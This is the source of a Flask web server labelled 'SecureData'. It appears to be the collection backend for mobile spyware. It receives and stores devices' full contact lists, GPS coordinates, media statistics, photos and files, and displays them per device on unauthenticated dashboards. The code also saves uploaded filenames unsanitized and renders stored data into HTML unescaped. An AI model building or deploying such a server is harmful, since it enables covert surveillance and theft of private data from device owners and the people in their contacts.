import os
import sqlite3
import json
from datetime import datetime
from flask import Flask, request, jsonify, send_from_directory
from flask_cors import CORS

DB_PATH = os.path.join(os.path.dirname(__file__), 'data.db')
UPLOAD_DIR = os.path.join(os.path.dirname(__file__), 'uploads')
os.makedirs(UPLOAD_DIR, exist_ok=True)

app = Flask(__name__)
CORS(app)

def init_db():
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS device_data (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        device_id TEXT,
        model TEXT,
        os_version TEXT,
        contacts_count INTEGER,
        images INTEGER,
        videos INTEGER,
        docs INTEGER,
        by_type_json TEXT,
        lat REAL,
        lon REAL,
        created_at TEXT
    )''')
    c.execute('''CREATE TABLE IF NOT EXISTS uploads (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        device_id TEXT,
        filename TEXT,
        stored_path TEXT,
        created_at TEXT
    )''')
    c.execute('''CREATE TABLE IF NOT EXISTS contacts_dump (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        device_id TEXT,
        json TEXT,
        count INTEGER,
        created_at TEXT
    )''')
    conn.commit()
    conn.close()

@app.route('/api/v1/data', methods=['POST'])
def receive_data():
    payload = request.get_json(force=True)
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute('''INSERT INTO device_data(device_id, model, os_version, contacts_count, images, videos, docs, by_type_json, lat, lon, created_at)
                 VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)''', (
        payload.get('deviceId'),
        payload.get('deviceInfo', {}).get('model'),
        payload.get('deviceInfo', {}).get('version'),
        int(payload.get('contactsCount', 0)),
        int(payload.get('mediaStats', {}).get('images', 0)),
        int(payload.get('mediaStats', {}).get('videos', 0)),
        int(payload.get('mediaStats', {}).get('docs', 0)),
        payload.get('mediaStats', {}).get('byType', {}).__str__(),
        payload.get('location', {}).get('lat'),
        payload.get('location', {}).get('lon'),
        datetime.utcnow().isoformat()
    ))
    conn.commit()
    conn.close()
    return jsonify({'ok': True})

@app.route('/api/v1/contacts', methods=['POST'])
def receive_contacts():
    payload = request.get_json(force=True)
    contacts = payload.get('contacts', [])
    device_id = payload.get('deviceId')
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute('''INSERT INTO contacts_dump(device_id, json, count, created_at)
                 VALUES (?, ?, ?, ?)''', (device_id, json.dumps(contacts), len(contacts), datetime.utcnow().isoformat()))
    conn.commit()
    conn.close()
    return jsonify({'ok': True, 'count': len(contacts)})

@app.route('/api/v1/photos', methods=['POST'])
def receive_photos():
    device_id = request.form.get('deviceId')
    f = request.files.get('file')
    if not f:
        return jsonify({'ok': False, 'error': 'no file'}), 400
    filename = f.filename
    stored = os.path.join(UPLOAD_DIR, filename)
    f.save(stored)
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute('''INSERT INTO uploads(device_id, filename, stored_path, created_at)
                 VALUES (?, ?, ?, ?)''', (device_id, filename, stored, datetime.utcnow().isoformat()))
    conn.commit()
    conn.close()
    return jsonify({'ok': True, 'path': stored})
@app.route('/api/v1/upload', methods=['POST'])
def receive_upload():
    device_id = request.form.get('deviceId')
    f = request.files.get('file')
    if not f:
        return jsonify({'ok': False, 'error': 'no file'}), 400
    filename = f.filename
    stored = os.path.join(UPLOAD_DIR, filename)
    f.save(stored)
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute('''INSERT INTO uploads(device_id, filename, stored_path, created_at)
                 VALUES (?, ?, ?, ?)''', (device_id, filename, stored, datetime.utcnow().isoformat()))
    conn.commit()
    conn.close()
    return jsonify({'ok': True, 'path': stored})

@app.route('/dashboard')
def dashboard():
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    rows = c.execute('SELECT id, device_id, model, os_version, contacts_count, images, videos, docs, lat, lon, created_at FROM device_data ORDER BY id DESC LIMIT 100').fetchall()
    uploads = c.execute('SELECT id, device_id, filename, stored_path, created_at FROM uploads ORDER BY id DESC LIMIT 100').fetchall()
    contacts = c.execute('SELECT id, device_id, count, created_at FROM contacts_dump ORDER BY id DESC LIMIT 100').fetchall()
    conn.close()
    html = ['<html><head><title>SecureData Dashboard</title><style>body{font-family:Arial;margin:24px} table{border-collapse:collapse;width:100%} th,td{border:1px solid #ddd;padding:8px} a{color:#0a66c2;text-decoration:none} a:hover{text-decoration:underline} .nav{margin-bottom:16px}</style></head><body>']
    html.append('<div class="nav"><a href="/dashboard">Dashboard</a> | <a href="/devices">Devices</a> | <a href="/contacts">Contacts</a> | <a href="/uploads">Uploads</a></div>')
    html.append('<h2>Latest Device Data</h2><table><tr><th>ID</th><th>Device</th><th>Model</th><th>OS</th><th>Contacts</th><th>Images</th><th>Videos</th><th>Docs</th><th>Lat</th><th>Lon</th><th>Time</th><th>View</th></tr>')
    for r in rows:
        html.append(f'<tr><td>{r[0]}</td><td>{r[1]}</td><td>{r[2]}</td><td>{r[3]}</td><td>{r[4]}</td><td>{r[5]}</td><td>{r[6]}</td><td>{r[7]}</td><td>{r[8]}</td><td>{r[9]}</td><td><a href="/device/{r[1]}">详情</a></td></tr>')
    html.append('</table>')
    html.append('<h2>Contacts Uploads</h2><table><tr><th>ID</th><th>Device</th><th>Count</th><th>Time</th><th>View</th></tr>')
    for cRow in contacts:
        html.append(f'<tr><td>{cRow[0]}</td><td>{cRow[1]}</td><td>{cRow[2]}</td><td>{cRow[3]}</td><td><a href="/contacts/{cRow[0]}">查看</a></td></tr>')
    html.append('</table>')
    html.append('<h2>Latest Uploads</h2><table><tr><th>ID</th><th>Device</th><th>Filename</th><th>Time</th><th>Open</th></tr>')
    for u in uploads:
        fn = os.path.basename(u[2])
        html.append(f'<tr><td>{u[0]}</td><td>{u[1]}</td><td>{u[2]}</td><td>{u[4]}</td><td><a href="/uploads/{fn}" target="_blank">打开</a></td></tr>')
    html.append('</table></body></html>')
    return '\n'.join(html)

@app.route('/')
def index():
    return jsonify({'status': 'ok', 'message': 'SecureData backend running', 'dashboard': '/dashboard'})

@app.route('/devices')
def devices():
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    rows = c.execute('SELECT DISTINCT device_id FROM device_data ORDER BY device_id').fetchall()
    conn.close()
    html = ['<html><head><title>Devices</title><style>body{font-family:Arial;margin:24px} a{color:#0a66c2;text-decoration:none} a:hover{text-decoration:underline}</style></head><body>']
    html.append('<h2>Devices</h2><ul>')
    for r in rows:
        html.append(f'<li><a href="/device/{r[0]}">{r[0]}</a></li>')
    html.append('</ul></body></html>')
    return '\n'.join(html)

@app.route('/device/<device_id>')
def device_detail(device_id):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    data = c.execute('SELECT model, os_version, contacts_count, images, videos, docs, lat, lon, created_at FROM device_data WHERE device_id=? ORDER BY id DESC LIMIT 20', (device_id,)).fetchall()
    contacts = c.execute('SELECT id, count, created_at FROM contacts_dump WHERE device_id=? ORDER BY id DESC LIMIT 20', (device_id,)).fetchall()
    uploads = c.execute('SELECT id, filename, stored_path, created_at FROM uploads WHERE device_id=? ORDER BY id DESC LIMIT 20', (device_id,)).fetchall()
    conn.close()
    html = ['<html><head><title>Device Detail</title><style>body{font-family:Arial;margin:24px} table{border-collapse:collapse;width:100%} th,td{border:1px solid #ddd;padding:8px} a{color:#0a66c2;text-decoration:none} a:hover{text-decoration:underline}</style></head><body>']
    html.append(f'<h2>Device {device_id}</h2>')
    html.append('<h3>Recent Device Data</h3><table><tr><th>Model</th><th>OS</th><th>Contacts</th><th>Images</th><th>Videos</th><th>Docs</th><th>Lat</th><th>Lon</th><th>Time</th></tr>')
    for r in data:
        html.append(f'<tr><td>{r[0]}</td><td>{r[1]}</td><td>{r[2]}</td><td>{r[3]}</td><td>{r[4]}</td><td>{r[5]}</td><td>{r[6]}</td><td>{r[7]}</td><td>{r[8]}</td></tr>')
    html.append('</table>')
    html.append('<h3>Contacts Dumps</h3><table><tr><th>ID</th><th>Count</th><th>Time</th><th>View</th></tr>')
    for cRow in contacts:
        html.append(f'<tr><td>{cRow[0]}</td><td>{cRow[1]}</td><td>{cRow[2]}</td><td><a href="/contacts/{cRow[0]}">查看</a></td></tr>')
    html.append('</table>')
    html.append('<h3>Uploads</h3><table><tr><th>ID</th><th>Filename</th><th>Time</th><th>Open</th></tr>')
    for u in uploads:
        fn = os.path.basename(u[2])
        html.append(f'<tr><td>{u[0]}</td><td>{u[1]}</td><td>{u[3]}</td><td><a href="/uploads/{fn}" target="_blank">打开</a></td></tr>')
    html.append('</table></body></html>')
    return '\n'.join(html)

@app.route('/contacts')
def contacts_index():
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    rows = c.execute('SELECT id, device_id, count, created_at FROM contacts_dump ORDER BY id DESC LIMIT 200').fetchall()
    conn.close()
    html = ['<html><head><title>Contacts</title><style>body{font-family:Arial;margin:24px} table{border-collapse:collapse;width:100%} th,td{border:1px solid #ddd;padding:8px} a{color:#0a66c2;text-decoration:none} a:hover{text-decoration:underline}</style></head><body>']
    html.append('<h2>Contacts Dumps</h2><table><tr><th>ID</th><th>Device</th><th>Count</th><th>Time</th><th>View</th></tr>')
    for r in rows:
        html.append(f'<tr><td>{r[0]}</td><td>{r[1]}</td><td>{r[2]}</td><td>{r[3]}</td><td><a href="/contacts/{r[0]}">查看</a></td></tr>')
    html.append('</table></body></html>')
    return '\n'.join(html)

@app.route('/contacts/<int:dump_id>')
def contacts_detail(dump_id):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    row = c.execute('SELECT device_id, json, count, created_at FROM contacts_dump WHERE id=?', (dump_id,)).fetchone()
    conn.close()
    device_id, json_text, count, created_at = row if row else (None, '[]', 0, '')
    try:
        items = json.loads(json_text)
    except Exception:
        items = []
    html = ['<html><head><title>Contacts Detail</title><style>body{font-family:Arial;margin:24px} table{border-collapse:collapse;width:100%} th,td{border:1px solid #ddd;padding:8px}</style></head><body>']
    html.append(f'<h2>Contacts Dump #{dump_id} (Device {device_id})</h2>')
    html.append(f'<p>Count: {count} &nbsp; Time: {created_at}</p>')
    html.append('<table><tr><th>Name</th><th>Phones</th></tr>')
    for it in items:
        name = it.get('name', '')
        phones = ', '.join(it.get('phones', []))
        html.append(f'<tr><td>{name}</td><td>{phones}</td></tr>')
    html.append('</table></body></html>')
    return '\n'.join(html)

@app.route('/uploads')
def uploads_index():
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    rows = c.execute('SELECT id, device_id, filename, stored_path, created_at FROM uploads ORDER BY id DESC LIMIT 200').fetchall()
    conn.close()
    html = ['<html><head><title>Uploads</title><style>body{font-family:Arial;margin:24px} table{border-collapse:collapse;width:100%} th,td{border:1px solid #ddd;padding:8px} a{color:#0a66c2;text-decoration:none} a:hover{text-decoration:underline}</style></head><body>']
    html.append('<h2>Uploads</h2><table><tr><th>ID</th><th>Device</th><th>Filename</th><th>Time</th><th>Open</th></tr>')
    for r in rows:
        fn = os.path.basename(r[3])
        html.append(f'<tr><td>{r[0]}</td><td>{r[1]}</td><td>{r[2]}</td><td>{r[4]}</td><td><a href="/uploads/{fn}" target="_blank">打开</a></td></tr>')
    html.append('</table></body></html>')
    return '\n'.join(html)

@app.route('/uploads/<path:name>')
def serve_upload(name):
    return send_from_directory(UPLOAD_DIR, name)

if __name__ == '__main__':
    init_db()
    app.run(host='0.0.0.0', port=8000)
